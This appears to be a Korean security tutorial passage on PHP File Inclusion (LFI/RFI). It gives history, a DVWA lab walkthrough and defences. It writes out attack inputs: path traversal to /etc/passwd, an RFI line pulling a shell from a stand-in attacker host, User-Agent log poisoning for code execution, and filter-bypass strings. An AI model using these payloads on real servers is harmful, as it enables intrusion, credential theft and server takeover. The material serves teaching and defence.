...
> **Path Traversal(CWE-22)** 측면은 **A01 Broken Access Control**로도 분류됩니다. 두 관점을 함께 이해합니다.
{: .prompt-info }
...
File Inclusion은 **2000년대 초중반 PHP 웹의 전성기**에 폭발적으로 나타났습니다. 당시 PHP는 `allow_url_fopen`이 켜져 있어 **`include()`에 URL을 그대로 넣을 수 있었고**, 개발자들이 `include($_GET['page'])` 같은 코드를 흔하게 작성했습니다. 그 결과 `?page=http://공격자/shell.txt` 한 줄이면 **즉시 원격 코드 실행(RFI)** 이 되는 사이트가 인터넷에 넘쳐났습니다.

당시 봇들은 구글 검색(이른바 "구글 도킹", `inurl:page=` 등)으로 취약 사이트를 **자동으로 찾아** c99·r57 같은 웹셸을 심었습니다. 이 재앙적 상황 때문에 **PHP는 5.2.0(2006)부터 `allow_url_include`를 분리해 기본값을 Off**로 바꿨고, **5.3.4(2010)에서는 널바이트(`%00`) 경로 우회**도 막았습니다. 그 뒤 RFI는 크게 줄고, 대신 서버 내부 파일을 노리는 **LFI + 로그 포이즈닝**이 주류가 되었습니다.

### 주요 침해 사건

| 연도 | 사건 | 내용 |
|---|---|---|
| 2004~2008 | **대량 RFI 디페이스먼트 시대** | 자동화 봇이 PHP RFI 취약점을 스캔해 웹셸을 심고 홈페이지를 무더기로 변조(zone-h 등에 기록) |
| 2011 | **TimThumb** (워드프레스 이미지 리사이저)[^c09_timthumb] | 원격 이미지를 가져오는 기능이 검증 미흡으로 **원격 PHP 실행**에 악용 → 수많은 워드프레스 사이트 침해 |
| 상시 | **LFI + Log Poisoning / `/proc/self/environ`** | RFI가 막힌 뒤, 서버 로그나 `/proc` 항목에 PHP를 심고 LFI로 포함시켜 RCE를 얻는 기법이 정착 |

> RFI의 황금기는 끝났지만, **레거시 서버나 잘못된 설정(`allow_url_include = On`)** 이 남아 있으면 여전히 한 줄로 서버가 넘어갑니다. 또 LFI는 로그·세션 파일과 결합해 지금도 활발히 악용됩니다.
{: .prompt-warning }

### 왜 이 공격이 통하는가 — 근본 원리

`include()`·`require()`는 단순히 "파일 내용을 가져오는" 함수가 아닙니다. **가져온 내용을 현재 페이지의 PHP 코드로 합쳐서 실행**합니다. 즉 `include`된 파일 안에 `<?php ... ?>`가 있으면 **그대로 실행**됩니다. 바로 이 점이 "파일을 읽는 것"과 "코드를 실행하는 것" 사이의 경계를 무너뜨립니다.

개발자는 `?page=welcome` 처럼 **미리 정해진 페이지 이름**이 올 것이라 가정하지만, 입력을 검증하지 않으면 공격자는 그 자리에 **임의 경로나 URL**을 넣습니다.

- **LFI**: `../`(상위 디렉터리 이동)를 반복해 웹 루트 밖의 `/etc/passwd`·설정 파일·로그로 빠져나갑니다. 파일 시스템은 `../`를 만나면 군말 없이 부모 디렉터리로 올라가기 때문입니다.
- **RFI**: 경로 자리에 `http://공격자/shell.txt`를 넣으면, 서버가 그 파일을 **내려받아 자신의 코드로 실행**합니다.
- **Log Poisoning**: 직접 `.php`를 못 올려도, **공격자가 내용을 통제할 수 있는 파일**(접근 로그의 User-Agent, 세션 파일 등)에 PHP를 심고 그 파일을 LFI로 포함시키면 코드가 실행됩니다.

```
?page=../../../etc/passwd          → 경로를 거슬러 올라가 파일 읽기 (LFI)
?page=http://attacker/shell.txt    → 원격 코드를 가져와 실행 (RFI)
?page=.../access.log (+ 로그에 PHP 심기) → LFI로 RCE (Log Poisoning)
```

근본 방어는 **"사용자 입력으로 파일 경로를 정하지 않는 것"** 입니다. 꼭 필요하면 **허용 파일명 화이트리스트**로 고정하고, 설정에서 **`allow_url_include = Off`**(RFI 차단)·**`open_basedir`**(경로 이탈 차단)를 둡니다.

---

## 1. File Inclusion이란

웹 애플리케이션이 외부 파일을 동적으로 불러올 때 발생하는 취약점입니다.  
개발자는 파일 이름을 파라미터로 받아 페이지를 구성하려고 했지만, 입력값 검증이 없으면 공격자가 임의의 파일을 지정할 수 있습니다.

대표적인 취약 코드 패턴은 다음과 같습니다.
...
이 코드는 `page` 파라미터에 어떤 값이 들어와도 그대로 파일을 인클루드합니다.  
정상 의도: `page=welcome.html` → 홈 화면  
공격자 입력: `page=../../../etc/passwd` → 시스템 파일 노출

> 사용자 입력으로 파일 경로를 결정하는 순간 File Inclusion 취약점의 씨앗이 심어집니다.
{: .prompt-danger }
...
LFI의 핵심 기법은 **Path Traversal**입니다.  
`../` (Dot-Dot-Slash)를 사용해 현재 디렉토리에서 상위 디렉토리로 이동합니다.
...
많은 개발자들이 파일 경로에 대한 입력값 검증 없이 파라미터를 그대로 사용합니다.
...
RFI는 피해자 서버가 공격자 서버에서 악성 파일을 직접 내려받아 실행하므로 **서버 완전 장악**으로 이어질 수 있습니다.

### 3.2 필요 조건

RFI가 성립하려면 피해자 서버의 `php.ini`에 다음 설정이 활성화되어 있어야 합니다.
...
DVWA Low 레벨은 이 조건이 충족된 환경입니다.

> `allow_url_include`는 보안상 절대 활성화해서는 안 되는 설정입니다.  
> 현대의 대부분 배포판은 기본값이 `Off`이지만, 오래된 서버나 레거시 환경에서는 활성화된 경우가 있습니다.
{: .prompt-warning }
...
보안 필터가 적용된 경우에도 우회 기법으로 공격이 가능합니다.
...
PHP 5.3.4 이전 버전에서 유효합니다. Null 바이트 이후의 문자열을 PHP가 무시합니다.
...
단순 `../` 필터를 우회합니다. 필터가 `../`를 제거해도 `....//`에서 가운데 `../`가 제거되면 남은 부분이 `../`가 됩니다.
...
> 핵심: 블랙리스트 치환(Medium)·접두사 검사(High)는 모두 우회됩니다.  
> Impossible처럼 **허용 파일명을 고정 목록으로 화이트리스트**하는 것만이 안전합니다(7장).
{: .prompt-tip }

### 5.1 LFI 기본 테스트

**DVWA > File Inclusion** 메뉴에 접속합니다.
...
> LFI로 DB 설정 파일을 읽으면 데이터베이스 계정 정보까지 탈취됩니다.  
> SQL Injection 없이도 DB 접근 권한을 얻을 수 있습니다.
{: .prompt-danger }
...
LFI와 로그 파일을 조합하면 **원격 코드 실행(RCE)**까지 이어집니다.
...
`User-Agent` 헤더에 PHP 코드를 심어 Apache 접근 로그에 기록시킵니다.
...
> Log Poisoning은 LFI만으로 RCE를 달성하는 강력한 기법입니다.  
> 로그 파일 읽기 권한이 있는 환경에서 적용됩니다.
{: .prompt-danger }
...
별도 브라우저 탭에서 DVWA File Inclusion 페이지로 이동합니다.
...
> 방화벽이 아웃바운드 HTTP를 허용한다면 내부망에서도 성립 가능합니다.
{: .prompt-danger }
...
Medium 레벨 소스 코드를 살펴보면 다음 필터가 적용되어 있습니다.
...
단순 문자열 치환 방식이므로 다음과 같이 우회할 수 있습니다.

### 6.1 RFI 우회 — 프로토콜 중복 삽입

필터가 `http://`를 제거하면 남은 부분이 다시 `http://`가 됩니다.
...
High 레벨은 `fnmatch("file*", $file)` 로 **파일명이 `file` 로 시작**해야만 통과시킵니다.  
...
Impossible 레벨은 **허용된 파일명만 명시적으로 화이트리스트**합니다.
...
`page` 값이 목록에 없으면 무조건 거부되므로, 경로 조작·프로토콜·중첩 우회가 모두 불가능합니다.
...
> `allow_url_include = Off` 한 줄만 설정해도 RFI 공격을 완전히 차단할 수 있습니다.  
> 서버 배포 시 반드시 확인해야 하는 항목입니다.
{: .prompt-tip }
...
File Inclusion은 단순해 보이지만 실제 피해는 매우 광범위합니다.
...
1. **LFI**: `../` 를 이용해 서버 내부 파일을 읽습니다. Log Poisoning과 결합하면 RCE로 이어집니다.
2. **RFI**: 외부 서버의 악성 파일을 피해자 서버에서 직접 실행합니다. `allow_url_include = On`이 전제 조건입니다.
3. **Path Traversal**: `../` 반복으로 웹 루트 외부 파일에 접근하는 기법입니다.
4. **Filter Bypass**: URL 인코딩, 이중 인코딩, 경로 중복 삽입으로 단순 필터를 우회합니다.
5. **핵심 방어**: 화이트리스트 검증 + `allow_url_include = Off` + `open_basedir` 설정입니다.

> File Inclusion은 "편리한 기능"이 "치명적인 취약점"이 되는 전형적인 사례입니다.  
> 사용자 입력으로 파일 경로를 결정하는 코드 패턴 자체를 피해야 합니다.
{: .prompt-tip }
...
| 구분 | 꼭 외울 것 |
|---|---|
| **LFI vs RFI** | 삽입 파일이 **로컬이면 LFI, 원격이면 RFI** |
| **RFI 대책** | PHP `php.ini`에서 **`allow_url_fopen`(및 `allow_url_include`)을 `Off`** |
| **위험 함수** | `include`·`require`는 포함한 파일을 **코드로 실행**. 파라미터 검증 미흡이 원인 |
| **연계 피해** | Path Traversal·XSS·디렉터리 조회·Log Poisoning(RCE)으로 확장 |

> **★ 함정**: "파일을 **읽을 수 있는** API는 모두 공격 대상이 된다"는 설명은 **맞습니다.** 반면 File Inclusion 대응으로 "무차별 대입 검증"을 고르면 **틀립니다**(파라미터 *값/경로 검증*이 핵심). 상세 이론은 **11번 포스트 8.3장** 참고.
{: .prompt-tip }
...
본문의 설정·사건은 아래 출처에 근거합니다(각주 번호를 클릭하면 이동).

**더 읽어보기**

- PHP 설정(`allow_url_include`/`allow_url_fopen`) — <https://www.php.net/manual/en/filesystem.configuration.php>
- OWASP Path Traversal — <https://owasp.org/www-community/attacks/Path_Traversal>

[^c09_timthumb]: TimThumb 원격 코드 실행 취약점(2011, CVE-2011-4106) — 워드프레스 대량 침해. Threatpost. <https://threatpost.com/zero-day-patched-in-timthumb-wordpress-script/106887/>
